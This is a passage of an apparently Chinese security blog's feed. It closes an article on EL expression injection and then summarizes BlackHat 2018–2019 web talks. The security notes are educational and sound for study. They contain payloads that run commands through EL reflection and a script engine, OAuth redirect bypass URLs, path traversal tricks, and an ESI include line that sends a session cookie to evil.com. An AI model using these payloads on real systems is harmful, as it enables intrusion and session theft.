class="string">"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;"</span>;</span><br><span class="line">        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);</span><br><span class="line">        System.out.println(valueExpression.getValue(simpleContext));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即触发：</p><p><img src="/2020/04/26/浅析EL表达式注入漏洞/7.png" alt=""></p><h2 id="0x05-绕过方法"><a href="#0x05-绕过方法" class="headerlink" title="0x05 绕过方法"></a>0x05 绕过方法</h2><p>这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。</p><h3 id="利用反射机制绕过"><a href="#利用反射机制绕过" class="headerlink" title="利用反射机制绕过"></a>利用反射机制绕过</h3><p>即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。</p><h3 id="利用ScriptEngine调用JS引擎绕过"><a href="#利用ScriptEngine调用JS引擎绕过" class="headerlink" title="利用ScriptEngine调用JS引擎绕过"></a>利用ScriptEngine调用JS引擎绕过</h3><p>同SpEL注入中讲到的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&apos;&apos;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/8.png" alt=""></p><h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul><li><p>尽量不使用外部输入的内容作为EL表达式内容；</p></li><li><p>若使用，则严格过滤EL表达式注入漏洞的payload关键字；</p></li><li><p>如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://www.runoob.com/jsp/jsp-expression-language.html" target="_blank" rel="noopener">JSP 表达式语言</a></p><p><a href="https://www.cnblogs.com/taoshihan/p/5638449.html" target="_blank" rel="noopener">EL表达式调用java方法</a></p><p><a href="https://www.cnblogs.com/junsec/p/11132652.html" target="_blank" rel="noopener">JAVA WEB EL表达式注入</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="EL注入" scheme="https://www.mi1k7ea.com/tags/EL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat 2019 Web小结</title>
    <link href="https://www.mi1k7ea.com/2020/04/20/BlackHat-2019-Web%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/04/20/BlackHat-2019-Web小结/</id>
    <published>2020-04-19T17:16:00.000Z</published>
    <updated>2020-05-10T16:05:17.730Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近整理下BlackHat 2019 Web相关议题，做下学习笔记。</p><h2 id="0x01-Make-Redirection-Evil-Again-URL-Parser-Issues-in-OAuth"><a href="#0x01-Make-Redirection-Evil-Again-URL-Parser-Issues-in-OAuth" class="headerlink" title="0x01 Make Redirection Evil Again - URL Parser Issues in OAuth"></a>0x01 Make Redirection Evil Again - URL Parser Issues in OAuth</h2><p>PDF：</p><p><a href="https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again.pdf" target="_blank" rel="noopener">https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again.pdf</a></p><p><a href="http://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again-wp.pdf" target="_blank" rel="noopener">http://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again-wp.pdf</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本议题主要介绍利用URL解析问题来绕过限制进行各种任意URL跳转攻击。</p><p>作者先介绍了什么是OAuth 2.0。OAuth（开放授权）是一个开放标准，允许用户授权第三方移动应用访问他们存储在另外的服务提供者上的信息，而不需要将用户名和密码提供给第三方移动应用或分享他们数据的所有内容，OAuth2.0是OAuth协议的延续版本，但不向后兼容OAuth 1.0即完全废止了OAuth1.0。</p><p>OAuth 2.0协议细节如图：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/1.png" alt=""></p><p>但是，如果OAuth 2.0登录时的重定向页面参数如上图的redirect_uri参数可被攻击者控制，那么将会造成任意URL跳转攻击：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/2.png" alt=""></p><p>针对这种攻击场景，开发者往往会采取一系列的校验措施，但是仅有校验完整的URL时才是无风险的，其他的校验方法会存在缺陷：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/3.png" alt=""></p><p>后面就看下几种绕过URL校验的技巧。</p><h3 id="Evil-Slash-Trick（恶意反斜杠）"><a href="#Evil-Slash-Trick（恶意反斜杠）" class="headerlink" title="Evil Slash Trick（恶意反斜杠）"></a>Evil Slash Trick（恶意反斜杠）</h3><p>如图，攻击者在redirect_uri参数中注入<code>https://evil.com\@good.com</code>，该URL在服务端校验时解析的Host识别的是<code>good.com</code>并将该URL内容作为302重定向响应返回给浏览器，由于浏览器会将反斜杠转换为斜杠，因此在客户端实际访问的Host为<code>evil.com</code>：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/4.png" alt=""></p><p>这是因为大多数浏览器都会将<code>/</code>和<code>\</code>视为路径分隔符，当用户在地址栏输入URL时，浏览器都是自动将<code>\</code>替换成<code>/</code>。</p><h3 id="Server-Decoding-Error（服务端解码错误）"><a href="#Server-Decoding-Error（服务端解码错误）" class="headerlink" title="Server Decoding Error（服务端解码错误）"></a>Server Decoding Error（服务端解码错误）</h3><p>如图，攻击者在redirect_uri参数中注入<code>https://evil.com%ff@good.com</code>，这里<code>%ff</code>为超出ASCII范围的字符、并不是正常的URL编码内容，在服务端进行URL校验时由于解码错误导致识别的Host为<code>good.com</code>，当响应给浏览器重定向时该不可打印的字符被统一转换为了<code>?</code>，从而浏览器解析的时候被截断跳转到<code>evil.com</code>：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/5.png" alt=""></p><h3 id="Browser-Decoding-Error（浏览器解码错误）"><a href="#Browser-Decoding-Error（浏览器解码错误）" class="headerlink" title="Browser Decoding Error（浏览器解码错误）"></a>Browser Decoding Error（浏览器解码错误）</h3><p>同上类似，不同之处在于用到<code>%bf</code>+<code>:</code>来组合使得浏览器URL解码错误，然后统一将不可见字符转换为<code>?</code>，从而绕过检测：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/6.png" alt=""></p><h3 id="Domain-Matching-Prefix-Matching（域名和前缀匹配）"><a href="#Domain-Matching-Prefix-Matching（域名和前缀匹配）" class="headerlink" title="Domain Matching+Prefix Matching（域名和前缀匹配）"></a>Domain Matching+Prefix Matching（域名和前缀匹配）</h3><p>如图，服务端用startsWith()函数以及url.host来检测Host和前缀名；Host部分的绕过可以利用前面的反斜杠绕过；前缀部分的校验可以通过注册一个<code>good.com.evil.com</code>即包括前缀弱校验白名单作为子域名：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/7.png" alt=""></p><h3 id="Malformed-Scheme（畸形的Scheme）"><a href="#Malformed-Scheme（畸形的Scheme）" class="headerlink" title="Malformed Scheme（畸形的Scheme）"></a>Malformed Scheme（畸形的Scheme）</h3><p>如图，可以利用浏览器自动补全Scheme的特性，攻击者在redirect_uri参数中注入<code>evil.com://good.com</code>，服务端校验URL识别的是<code>good.com</code>，返回浏览器后URL被补全为<code>https://evil.com://good.com</code>从而成功绕过：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/8.png" alt=""></p><h3 id="IPv6-Address-Parsing-Bug（IPv6地址解析Bug）"><a href="#IPv6-Address-Parsing-Bug（IPv6地址解析Bug）" class="headerlink" title="IPv6 Address Parsing Bug（IPv6地址解析Bug）"></a>IPv6 Address Parsing Bug（IPv6地址解析Bug）</h3><p>如图，某些URL解析器会将<code>[]</code>内的任何字符串视为IPv6主机而没有任何校验：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/9.png" alt=""></p><h2 id="0x02-Preloading-Insecurity-In-Your-Electron"><a href="#0x02-Preloading-Insecurity-In-Your-Electron" class="headerlink" title="0x02 Preloading Insecurity In Your Electron"></a>0x02 Preloading Insecurity In Your Electron</h2><p>PDF：</p><p><a href="https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron.pdf" target="_blank" rel="noopener">https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron.pdf</a></p><p><a href="https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron-wp.pdf</a></p><p>Electron历史漏洞：</p><p><a href="https://www.freebuf.com/video/207509.html" target="_blank" rel="noopener">https://www.freebuf.com/video/207509.html</a></p><p>Electron基本安全测试指南：</p><p><a href="https://xz.aliyun.com/t/2461" target="_blank" rel="noopener">https://xz.aliyun.com/t/2461</a></p><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Electron是Github开发的一个开源框架，它允许使用Node.js（作为后端）和Chromium（作为前端）完成桌面GUI应用程序的开发。Electron现已被多个开源Web应用程序用于前端和后端的开发，著名项目包括Github的Atom和微软的VSC。</p><p>本议题作者提出来一个新的漏洞类别，即：针对新版本的Electron应用，在没有Bypass nodeIntegration限制的情况下，可以通过BrowserWindow的Preload来扩展攻击面，实现绕过隔离来访问Node.js的原语，再次实现从XSS到RCE的攻击利用。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>Electron的nodeIntegration属性是用来开启Node API访问权限的，默认不开启，因此XSS无法访问底层OS。但是Electron创建浏览器窗口时传入属性preload，preload属性能够在WebView内所有脚本执行之前先执行指定的脚本，preload环境可以使用Node API。</p><p>简单地说，和PHP中利用LD_PRELOAD绕过disable_function是异曲同工之妙。</p><p>具体的怎么利用看官方文档即可。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="BlackHat" scheme="https://www.mi1k7ea.com/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat 2018 Web小结</title>
    <link href="https://www.mi1k7ea.com/2020/04/20/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/04/20/BlackHat-2018-Web小结/</id>
    <published>2020-04-19T17:15:47.000Z</published>
    <updated>2020-05-10T16:03:36.019Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近整理下BlackHat 2018 Web相关议题，做下学习笔记。</p><h2 id="0x01-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）"><a href="#0x01-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）" class="headerlink" title="0x01 Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）"></a>0x01 Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）</h2><p>PDF：</p><p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf</a></p><p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking-wp.pdf</a></p><p>其他参考：</p><p><a href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection" target="_blank" rel="noopener">https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection</a></p><p><a href="https://xz.aliyun.com/t/5159" target="_blank" rel="noopener">浅析Edge Side Include注入（上）</a></p><p><a href="https://xz.aliyun.com/t/5261" target="_blank" rel="noopener">浅析Edge Side Include注入（下）</a></p><h3 id="何为ESI"><a href="#何为ESI" class="headerlink" title="何为ESI"></a>何为ESI</h3><p>ESI全称Edge Side Includes，是一种数据缓冲/缓存服务器，它提供将Web网页的部分（这里指页面的片段）进行缓冲/缓存的技术及服务。</p><p>ESI语言是基于XML标签的标记语言，用于改善HTTP中间件加载大量Web内容缓存时造成的性能下降。使用ESI标签可以指示反向代理服务器（或缓存服务器）获取已缓存Web页面模版的更多信息。传递给客户端的这些信息可能还来自另一台服务器（非后端服务器），该服务器可以完全缓存包含动态内容的页面。</p><p>如图，对于大型网站来说，页面很多部分其实都是静态的东西，部分是动态的比如天气信息等，网站为了提高性能将静态的内容缓存到前端的反向代理服务器中，将ESI指令发送给服务器端，然后在反向代理服务器进行内容的解析拼接后返回给浏览器：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/1.png" alt=""></p><h3 id="ESI-Demo"><a href="#ESI-Demo" class="headerlink" title="ESI Demo"></a>ESI Demo</h3><p>如下，使用ESI语言的”Include”在page1中包含page2并展示在页面中：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/2.png" alt=""></p><p>最终在浏览器端显示的是如下已经解析成功的内容，即用户访问page1的时候同时看到了page2的内容：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/3.png" alt=""></p><p>整个ESI语言解析流程如图：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/4.png" alt=""></p><p>当然，ESI语言也支持更多的常量来设置常用的变量值：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/5.png" alt=""></p><h3 id="ESI注入攻击原理"><a href="#ESI注入攻击原理" class="headerlink" title="ESI注入攻击原理"></a>ESI注入攻击原理</h3><p>由前面可知，ESI通过允许开发人员用ESI标签替换页面的动态部分来增加缓存灵活性。ESI标签在Web应用的服务端发送，在Web应用的代理服务器解析，这种看似不可控的模式难道不存在安全风险吗？</p><p><strong>HTTP代理服务器无法区分后端服务器提供的合法ESI标签和HTTP响应中注入的恶意标签。也就是说，如果攻击者能够在HTTP响应中注入恶意ESI标签，那么代理服务器将会无差别地去解析和执行它们。</strong></p><p>还是这个图，在第三步中，Web应用服务器给缓存服务器发送ESI语言，要求缓存服务器执行ESI语言，问题在于第一步客户端给Web应用服务器发送请求时，其中就插入了恶意ESI标签，这样的话到第三步的时候缓存服务器执行ESI语言时就会将恶意的ESI标签一并执行了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/4.png" alt=""></p><h3 id="ESI注入攻击——SSRF"><a href="#ESI注入攻击——SSRF" class="headerlink" title="ESI注入攻击——SSRF"></a>ESI注入攻击——SSRF</h3><p>如图，后端服务器将客户端传来的ESI标签payload传给代理服务器，代理服务器执行了ESI标签payload，并将完整的响应发送给了客户端：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/6.png" alt=""></p><h3 id="ESI注入攻击——绕过XSSFilter"><a href="#ESI注入攻击——绕过XSSFilter" class="headerlink" title="ESI注入攻击——绕过XSSFilter"></a>ESI注入攻击——绕过XSSFilter</h3><p>绕过XSSFilter的payload：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/E:/software/hexo/blog/source/_posts/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/9.png" alt=""></p><p><code>&lt;esi:assign&gt;</code>标签可以操作存储在服务端ESI变量中的任意值。<code>$(变量名)</code>操作符可以访问这个变量的值。</p><p>上述的注入在浏览器页面中实际返回如下，能成功绕过XSSFilter的过滤：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/E:/software/hexo/blog/source/_posts/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/10.png" alt=""></p><p>此外，某些服务器不支持ESI vars标签，此时可以通过SSRF来进行XSS攻击：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/E:/software/hexo/blog/source/_posts/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/11.png" alt=""></p><h3 id="ESI注入攻击——无JS窃取HttpOnly-Cookie"><a href="#ESI注入攻击——无JS窃取HttpOnly-Cookie" class="headerlink" title="ESI注入攻击——无JS窃取HttpOnly Cookie"></a>ESI注入攻击——无JS窃取HttpOnly Cookie</h3><p>如下，PHP脚本中插入了ESI标签，该标签获取phpsessid值并输出在页面上，同时PHP会接收GET请求的city参数输出在页面上。这里使用<code>&lt;esI:vars&gt;</code>标签来输出Cookie常量即可实现无JS窃取这个HttpOnly Cookie：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/7.png" alt=""></p><p>进一步，可以使用ESI的include标签使得代理服务器把phpsessid发送给攻击者的服务器中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;esi:include src=&quot;http://evil.com/?cookie=$(HTTP_COOKIE&#123;&apos;PHPSESSID&apos;&#125;)&quot; /&gt;</span><br></pre></td></tr></table></figure><p>接着，在攻击者服务器的日志中就能接收到PHPSESSID了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/8.png" alt=""></p><h3 id="各应用支持情况"><a href="#各应用支持情况" class="headerlink" title="各应用支持情况"></a>各应用支持情况</h3><p><img src="/2020/04/20/BlackHat-2018-Web小结/12.png" alt=""></p><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>在项目中可使用同样的payload来测试是否支持ESI注入，当注入的ESI原样返回时，则存在问题：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/13.png" alt=""></p><p>也可以使用自动化扫描工具来发现：</p><ul><li>Burp ActiveScan++</li><li>Burp Upload Scanner</li><li>Acunetix </li></ul><h2 id="0x02-Breaking-Parser-Logic-Take-Your-Path-Normalization-off-and-Pop-0days-Out"><a href="#0x02-Breaking-Parser-Logic-Take-Your-Path-Normalization-off-and-Pop-0days-Out" class="headerlink" title="0x02 Breaking Parser Logic: Take Your Path Normalization off and Pop 0days Out!"></a>0x02 Breaking Parser Logic: Take Your Path Normalization off and Pop 0days Out!</h2><p>PDF：<a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p><h3 id="路径归一化盲区"><a href="#路径归一化盲区" class="headerlink" title="路径归一化盲区"></a>路径归一化盲区</h3><p>一般的，在对外部输入字符串校验之前，需要使用java.text.Normalizer的normalize()方法先对其进行归一化（Unicode Normalization）处理。<strong>归一化可以确保具有相同意义的字符串具有统一的二进制描述。</strong></p><p>但是归一化处理会存在一个问题，即Inconsistency，前后不一致。具体的说，就是路径检查器和路径解析器之间的解析存在不一致，从而导致存在安全问题，使得一些安全机制被绕过。</p><p>归一化的不一致表现在各个方面。</p><h4 id="不同OS不一致"><a href="#不同OS不一致" class="headerlink" title="不同OS不一致"></a>不同OS不一致</h4><p>如下是不同OS上表现的不一致，在Windows下会被解析为一个UNC地址，而在Linux下则是一个URL：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/14.png" alt=""></p><h4 id="不同编码不一致"><a href="#不同编码不一致" class="headerlink" title="不同编码不一致"></a>不同编码不一致</h4><p>在不同编码中表现不一致也存在一样的问题，比如代码不允许使用”secadmin”来查询数据库，但是如果数据库编码为utf8_general_ci（utf8_general_cs和utf8_bin均不行），则可以使用”ßecadmin”来绕过检测。</p><p>几个编码区别如下：</p><ul><li>utf8_general_ci：不区分大小写，这个你在注册用户名和邮箱的时候就要使用；</li><li>utf8_general_cs：区分大小写，如果用户名和邮箱用这个 就会照成不后果；</li><li>utf8_bin：字符串每个字符串用二进制数据编译存储。 区分大小写，而且可以存二进制的内容；</li></ul><h4 id="归一化顺序不同"><a href="#归一化顺序不同" class="headerlink" title="归一化顺序不同"></a>归一化顺序不同</h4><p>在某些开发场景中，会对外部传入的URL参数先调用过滤如<code>..</code>、<code>/</code>、<code>\</code>等特殊字符的黑明单过滤函数进行过滤，再使用Normalizer.normalize()函数进行归一化处理。这种颠倒的顺序会导致容易被编码绕过。</p><h4 id="Q-E"><a href="#Q-E" class="headerlink" title="..\Q/\E"></a>..\Q/\E</h4><p>你能看出getAsset()函数的安全问题吗？</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/15.png" alt=""></p><p>Pattern.quote(str)函数返回值为<code>\Qstr\E</code>，\Q代表字面内容的开始，\E代表字面内容的结束，也就是说返回值使str没有任何正则表达式意义，即使其中含有正则表达式内容也被转变为字符串常量：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/16.png" alt=""></p><p>问题在哪看个例子就知道了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String path = <span class="string">"file:///root/../\\Q/\\Epasswd"</span>;</span><br><span class="line">        String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator);</span><br><span class="line">        String DIRECTIVE_FILE_SEPARATOR = <span class="string">"/"</span>;</span><br><span class="line">        path = path.replace(QUOTED_FILE_SEPARATOR, DIRECTIVE_FILE_SEPARATOR);</span><br><span class="line">        System.out.println(path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/20/BlackHat-2018-Web小结/17.png" alt=""></p><h4 id="Nginx斜杠绕过"><a href="#Nginx斜杠绕过" class="headerlink" title="Nginx斜杠绕过"></a>Nginx斜杠绕过</h4><p>作者举的例子，路径<code>/static</code>被命中则会访问<code>/home/app/static/</code>下的资源文件，即相当于路径检查器；但是Nginx会自动在这种特殊路径<code>../</code>前加上斜杠，导致预设的路径<code>/home/app/static/</code>被穿越了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/18.png" alt=""></p><p>此外，作者介绍了自己盲测的payload：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/19.png" alt=""></p><p>最终获取到非预设目录的其他文件：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/20.png" alt=""></p><p>出于这种思路，作者发现了如下CVE：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/21.png" alt=""></p><h3 id="深入代码审计现存的应用"><a href="#深入代码审计现存的应用" class="headerlink" title="深入代码审计现存的应用"></a>深入代码审计现存的应用</h3><h4 id="Spring-0day-CVE-2018-1271"><a href="#Spring-0day-CVE-2018-1271" class="headerlink" title="Spring 0day - CVE-2018-1271"></a>Spring 0day - CVE-2018-1271</h4><p>这是个运行在Windows系统上的Spring路径穿越漏洞。</p><p>如图，如果传入的路径包含危险字符<code>..</code>就调用cleanPath()函数进行处理：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/22.png" alt=""></p><p>cleanPath()函数的作用是将包含<code>..</code>的这种相对路径转换成绝对路径，比如<code>/foo/bar/../</code>经过处理后变成<code>/foo/</code>：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/23.png" alt=""></p><p>而该函数的问题在于第四行，其是允许空元素存在的。也就是说，cleanPath()函数会把<code>//</code>当成是一个目录，但是Windows系统是不会把<code>//</code>当成一个目录的，这就存在二义性问题了。</p><p>如下是作者测试时的payload对比结果：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/24.png" alt=""></p><p>通过这种不一致，实现Windows任意文件读取，payload如下：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/25.png" alt=""></p><h4 id="Rails-0day-CVE-2018-3760"><a href="#Rails-0day-CVE-2018-3760" class="headerlink" title="Rails 0day - CVE-2018-3760"></a>Rails 0day - CVE-2018-3760</h4><p>如图，在Rails这个Web框架中，当传入的URL中存在<code>file://</code>字符串时会被认为是绝对路径；随后使用URL编码来绕过双斜杠归一化；接着在split_file_uri()方法中对传入的URL进行解码：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/26.png" alt=""></p><p>如下，URL进来后，会调用forbidden_request()函数对传入的path进行检查：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/27.png" alt=""></p><p>在forbidden_request()函数中，如果path包含<code>..</code>则认为是危险路径：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/28.png" alt=""></p><p>如果请求中包含<code>..</code>即返回真，然后返回forbidden_response(env)信息：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/29.png" alt=""></p><p>如果传入的path没有包含危险字符<code>..</code>，那么继续跟踪会来到split_file_uri()函数，这里如果传入双重URL编码后的<code>.</code>最终会被解码，这就导致了前面的forbidden_request()函数形同虚设了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/30.png" alt=""></p><p>最后，作者指出文件若是以<code>.erb</code>结尾，则会执行erb里面的命令，因此这是个RCE漏洞：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/31.png" alt=""></p><h3 id="新的多层架构攻击面"><a href="#新的多层架构攻击面" class="headerlink" title="新的多层架构攻击面"></a>新的多层架构攻击面</h3><p>反向代理架构带来很多好处，比如资源共享、负载均衡、高速缓存、统一入口提高安全性等。</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/32.png" alt=""></p><p>但是如果反向代理服务器遇到如下畸形URL时，它们的二义性将导致安全问题的产生：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/33.png" alt=""></p><p>当然，仅仅是开个玩笑而已：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/34.png" alt=""></p><p>危害主要是可以绕过黑白名单的ACL限制、逃逸上下文匹配等：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/35.png" alt=""></p><p>这个问题是在默认设置下发现的，也就是说如果用到了下面提到的反向代理模块就可能已经中招了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/36.png" alt=""></p><p>在反向代理架构中，Tomcat对<code>/..;/</code>认知存在问题：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/37.png" alt=""></p><p>通过<code>/..;/</code>可以绕过ACL、逃逸到上级路径访问管理接口：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/38.png" alt=""></p><p>如下，有个管理后台需要登录认证才能访问：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/39.png" alt=""></p><p>通过测试观察发现，该站点是使用Nginx做反向代理服务器，使用Tomcat做后端服务器：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/40.png" alt=""></p><p><img src="/2020/04/20/BlackHat-2018-Web小结/41.png" alt=""></p><p>此时在URL中注入<code>/..;/</code>时，Nginx和Tomcat对该URL的认知就存在二义性：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/42.png" alt=""></p><p>利用二义性就能未授权访问修改密码页面了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/43.png" alt=""></p><p>通过cmf或者后台界面样式，可以识别出基于Railo开发的管理台，Railo支持自定义模板，通过这个功能进一步取得shell权限：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/44.png" alt=""></p><h2 id="0x03-WebAssembly-A-New-World-of-Native-Exploits-on-the-Browser（WebAssembly：浏览器漏洞的新世界）"><a 